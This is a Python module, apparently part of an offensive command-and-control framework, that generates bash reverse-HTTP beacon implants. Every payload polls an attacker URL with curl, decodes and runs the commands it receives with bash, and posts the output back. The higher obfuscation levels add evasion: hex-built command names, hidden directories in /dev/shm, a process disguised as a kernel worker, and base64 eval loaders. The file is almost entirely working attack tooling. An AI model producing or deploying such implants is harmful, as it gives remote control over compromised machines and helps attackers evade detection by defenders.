import base64
from core.payload_generator.common import payload_utils as payutils
import textwrap
import shlex
import re
from colorama import init, Fore, Style

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"

def make_raw(beacon_url, interval, curl_opts=None, jitter=0):
	extra_curl = " ".join(curl_opts) + " " if curl_opts else ""
	if jitter and jitter > 0:
		sleep_cmd = f'sleep $(( INTERVAL + (RANDOM % (INTERVAL * {jitter} / 100 + 1)) ))'
	else:
		sleep_cmd = 'sleep "$INTERVAL"'

	parts = []

	# ─── 1) gen_sid() ────────────────────────────────────────────────────────────────
	parts.append(r"""gen_sid(){ local chars=abcdefghijklmnopqrstuvwxyz0123456789 part idx; for idx in 1 2 3; do part=""; for j in {1..5}; do part+=${chars:RANDOM%${#chars}:1}; done; sid[$((idx-1))]=$part; done; printf "%s-%s-%s" "${sid[0]}" "${sid[1]}" "${sid[2]}"; }""")

	# ─── 2) Init ───────────────────────────────────────────────────────────────────
	parts.append(f'BEACON_URL="{beacon_url}"')
	parts.append(f'INTERVAL={interval}')
	parts.append('SID=$(gen_sid)')

	# ─── 3) Loop fetch & exec ───────────────────────────────────────────────────────
	parts.append(f"""while :; do resp=$(curl -s {extra_curl}-H "X-Session-ID: $SID" --noproxy "*" "$BEACON_URL"); cmd_b64=$(printf "%s\\n" "$resp" | sed -n '\\''s/.*"cmd"[[:space:]]*:[[:space:]]* "\\([^"]*\\)".*/\\1/p'\\'');  if [ -n "$cmd_b64" ]; then cmd=$(printf "%s" "$cmd_b64" | base64 -d); output=$(bash -c "$cmd" 2>&1); out_b64=$(printf "%s" "$output" | base64 | tr -d '\\''\\n'\\''); body=$(printf '\\''{{\"output\":\"%s\"}}'\\''" "$out_b64"); curl -s -X POST {extra_curl}-H "X-Session-ID: $SID" -H "Content-Type: application/json" --data "$body" --noproxy "*" "$BEACON_URL" >/dev/null; fi; {sleep_cmd}; done""")

	inner = "; ".join(parts)
	return f"bash -c '{inner}'"



def generate_bash_reverse_http(ip, port, obs, beacon_interval, headers=None, useragent=None, accept=None, byte_range=None, jitter=0):
	beacon_url = f"http://{ip}:{port}/"
	interval = beacon_interval

	curl_opts = []
	
	if useragent:
		curl_opts.append(f"-A {useragent}")

	if headers:
		for k, v in headers.items():
			curl_opts.append(f"-H {k}: {v}")

	if accept:
		curl_opts.append(f"-H Accept: {accept}")

	if byte_range:
		curl_opts.append(f"--range {byte_range}")
	# Always disable proxy to avoid leaking
	curl_opts.append("--noproxy '*'")

	if obs == 0:
		payload = make_raw(beacon_url, interval, curl_opts, jitter)
		payutils.copy_and_print(payload)
		return payload

	elif obs == 1:
		payload = generate_bash_reverse_http_obs1(beacon_url, interval)
		payutils.copy_and_print(payload)
		return payload

	elif obs == 2:
		payload = generate_bash_reverse_http_obs2(beacon_url, interval)
		payutils.copy_and_print(payload)
		return payload

	elif obs == 3:
		payload = generate_bash_reverse_http_obs3(beacon_url, interval)
		payutils.copy_and_print(payload)
		return payload
		
	else:
		print(brightred + f"[!] Unsupported obfuscation level was selected use levels 1-3")


def generate_bash_reverse_http_obs1(beacon_url, interval):
	parts = []

	# ─── 1) gen_sid() ────────────────────────────────────────────────────────────────
	parts.append(f"""gen_sid(){{ local chars=abcdefghijklmnopqrstuvwxyz0123456789 part idx; for idx in 1 2 3; do part=""; for j in {{1..5}}; do part+=${{chars:RANDOM%${{#chars}}:1}}; done; sid[$((idx-1))]=$part; done; printf "%s-%s-%s" "${{sid[0]}}" "${{sid[1]}}" "${{sid[2]}}"; }}""")

	# ─── 2) Init & evasion setup ──────────────────────────────────────────────────────
	parts.append(f"INTERVAL={interval}")
	parts.append(f"""rnd_loops=$((RANDOM%5+3)); junk=0; for((i=0;i<rnd_loops;i++)); do junk=$((junk+(RANDOM%50)*i)); done; sleep $INTERVAL; base_dir="${{XDG_RUNTIME_DIR:-/dev/shm}}/.`tr -dc a-z0-9 </dev/urandom|head -c4`"; mkdir -p "$base_dir"; tmp="$base_dir/.`tr -dc a-z0-9 </dev/urandom|head -c5`"; cc=$(printf "%b" "\\x63\\x75\\x72\\x6c"); pr=$(printf "%b" "\\x70\\x72\\x69\\x6e\\x74\\x66"); sd=$(printf "%b" "\\x73\\x65\\x64"); bs=$(printf "%b" "\\x62\\x61\\x73\\x68"); u=$(printf "%b" "{beacon_url}"); SID=$(gen_sid)""")

	# ─── 3) Beacon loop ───────────────────────────────────────────────────────────────
	parts.append(f"""while :; do resp=$($cc -s -H "X-Session-ID: $SID" --noproxy "*" "$u"); cmd_b64=$($pr "%s\\n" "$resp" | $sd -n 's/.*"cmd"[[:space:]]*:[[:space:]]*"\\([^"]*\\)".*/\\1/p'); if [ -n "$cmd_b64" ]; then cmd=$($pr "%s" "$cmd_b64" | base64 -d); output=$($bs -c "$cmd" 2>&1); out_b64=$($pr "%s" "$output" | base64 | tr -d '\\n'); body=$($pr '{{"output":"%s"}}' "$out_b64"); $cc -s -X POST -H "X-Session-ID: $SID" -H "Content-Type: application/json" --data "$body" --noproxy "*" "$u" >/dev/null; fi; sleep $INTERVAL; done""")

	# join into a multi-line script
	script = "\n".join(parts)

	# wrap in a backgrounded, renamed subshell
	return (
		f"( exec -a kworker/0:1-events bash <<'EOF'\n"
		f"{script}\n"
		f"EOF\n"
		f") &"
	)


def generate_bash_reverse_http_obs2(beacon_url: str, interval: int) -> str:
	parts = []

	# ─── 1) resolve commands ────────────────────────────────────────────────────────
	parts.append(f"""CC=$(which curl); SD=$(which sed); PR=$(which printf); BS=$(which bash)""")

	# ─── 2) gen_sid() (exactly as in obs=1) ───────────────────────────────────────────
	parts.append(f"""gen_sid(){{ local chars=abcdefghijklmnopqrstuvwxyz0123456789 part idx; for idx in 1 2 3; do part=""; for j in {{1..5}}; do part+=${{chars:RANDOM%${{#chars}}:1}}; done; sid[$((idx-1))]=$part; done; $PR "%s-%s-%s" "${{sid[0]}}" "${{sid[1]}}" "${{sid[2]}}"; }}""")

	# ─── 3) init & beacon params ───────────────────────────────────────────────────
	parts.append(f"INTERVAL={interval}")
	parts.append(f'URL="{beacon_url}"')
	parts.append("SID=$(gen_sid)")
	parts.append("set -m")
	parts.append("PGID=$$")
	parts.append("trap 'exit 0' TERM INT")
	parts.append(f'$PR "[*] Session: %s\\n" "$SID"')

	# ─── 4) the polling loop (same as obs=1) ────────────────────────────────────────
	parts.append(f"""while :; do
  resp=$($CC -s -H "X-Session-ID: $SID" --noproxy "*" "$URL")
  cmd_b64=$($PR "%s\\n" "$resp" | $SD -n 's/.*"cmd"[[:space:]]*:[[:space:]]*"\\([^"]*\\)".*/\\1/p')
  $PR "%s\\n" "TESTED PRINT"
  if [ -n "$cmd_b64" ]; then
	cmd=$($PR "%s" "$cmd_b64" | base64 -d)

	if [ "$cmd" = "EXIT_SHELL" ]; then
		$PR "[*] received EXIT_SHELL, tearing down implant\n"
		break
	fi

	output=$($BS -c "$cmd" 2>&1)
	out_b64=$($PR "%s" "$output" | base64 | tr -d '\\n')
	body=$($PR '{{"output":"%s"}}' "$out_b64")
	$CC -s -X POST \
		-H "X-Session-ID: $SID" \
		-H "Content-Type: application/json" \
		--data "$body" --noproxy "*" "$URL" >/dev/null
  fi

  sleep $INTERVAL
done

exit 0""")

	# ─── 5) join it all into one script ─────────────────────────────────────────────
	lvl1 = "\n".join(parts)

	# ─── 6) base64-encode that full script (preserving newlines) ────────────────────
	blob = base64.b64encode(lvl1.encode()).decode()

	# ─── 7) emit the tiny loader that decodes & evals it in-memory ────────────────
	# NOTE the correct printf usage and eval syntax!
	payload = (
		"( exec -a kworker/0:1-events bash <<'EOF'\n"
		f"eval \"$(printf '%s' '{blob}' | base64 -d)\"\n"
		"EOF\n"
		") &"
	)

	return payload


def generate_bash_reverse_http_obs3(beacon_url, interval):
	parts = []

	parts.append(r"set -m")
	parts.append(r"PGID=$$")
	parts.append(r"trap 'exit 0' TERM INT")

	# ─── 0) Build all your “binaries” via printf ────────────────────────────────────
	parts.append(r"C=$(printf '\x63'); U=$(printf '\x75'); R=$(printf '\x72'); L=$(printf '\x6c'); CC=""$C$U$R$L""")
	parts.append(r"S=$(printf '\x73'); E=$(printf '\x65'); D=$(printf '\x64'); SD=""$S$E$D""")
	parts.append(r"P=$(printf '\x70'); R2=$(printf '\x72'); I=$(printf '\x69'); N=$(printf '\x6e'); T=$(printf '\x74'); F=$(printf '\x66'); PR=""$P$R2$I$N$T$F""")
	parts.append(r"B=$(printf '\x62'); A=$(printf '\x61'); S2=$(printf '\x73'); H=$(printf '\x68'); BS=""$B$A$S2$H""")

	# ─── 1) Randomize your header name ────────────────────────────────────────────────
	parts.append(r'headers=("X-Session-ID" "X-API-KEY" "X-Forward-Key")')
	parts.append(r'HIDX=$((RANDOM % ${#headers[@]}))')
	parts.append(r'HDR="${headers[$HIDX]}"')

	# ─── 1.5) PHP endpoints list ─────────────────────────────────────────────────────
	parts.append(r'files=("index.php" "api.php" "update.php" "status.php" "ping.php")')

	# ─── 2) gen_sid() ────────────────────────────────────────────────────────────────
	parts.append(f"""gen_sid(){{ local c=abcdefghijklmnopqrstuvwxyz0123456789 part i; \
for i in 1 2 3; do part=""; for _ in {{1..5}}; do part+=${{c:RANDOM%${{#c}}:1}}; done; \
sid[$((i-1))]=$part; done; $PR "%s-%s-%s" "${{sid[0]}}" "${{sid[1]}}" "${{sid[2]}}"; }}""")

	# ─── 3) Init & beacon params ────────────────────────────────────────────────────
	parts.append(f"INTERVAL={interval}")
	# strip trailing slash so we can append "/$file"
	parts.append(f'BASE="{beacon_url.rstrip("/")}"')
	parts.append("SID=$(gen_sid)")
	parts.append(r'$PR "[*] Session: %s\n" "$SID"')

	# ─── 4) Polling loop with random PHP file each iteration ────────────────────────
	parts.append(f"""while :; do \
  file=${{files[RANDOM % ${{#files[@]}}]}}; \
  URL="$BASE/$file"; \
  resp=$($CC -s -H "$HDR: $SID" --noproxy "*" "$URL"); \
  cmd_b64=$($PR "%s\\n" "$resp" | $SD -n 's/.*"cmd"[[:space:]]*:[[:space:]]*"\\([^"]*\\)".*/\\1/p'); \
  if [ -n "$cmd_b64" ]; then \
	cmd=$($PR "%s" "$cmd_b64" | base64 -d); \
	if [ "$cmd" = "EXIT_SHELL" ]; then
		set -m
		PGID=$$
		trap 'exit 0' TERM INT
		kill -TERM -0
		exit 0
	fi
	output=$($BS -c "$cmd" 2>&1); \
	out_b64=$($PR "%s" "$output" | base64 | tr -d '\\n'); \
	body=$($PR '{{"output":"%s"}}' "$out_b64"); \
	$CC -s -X POST -H "$HDR: $SID" -H "Content-Type: application/json" \
		--data "$body" --noproxy "*" "$URL" >/dev/null; \
  fi; \
  sleep $INTERVAL; \
done""")

	# 5) Join into the multi-line Level-2 script
	lvl = "\n".join(parts)

	# 6) Base64-encode it
	blob = base64.b64encode(lvl.encode()).decode()

	# 7) Wrap in an exec-a here-doc loader that evals the decoded blob
	return (
		"( exec -a kworker/0:1-events bash <<'EOF'\n"
		f"eval \"$(printf '%s' '{blob}' | base64 -d)\"\n"
		"EOF\n"
		") &"
	)
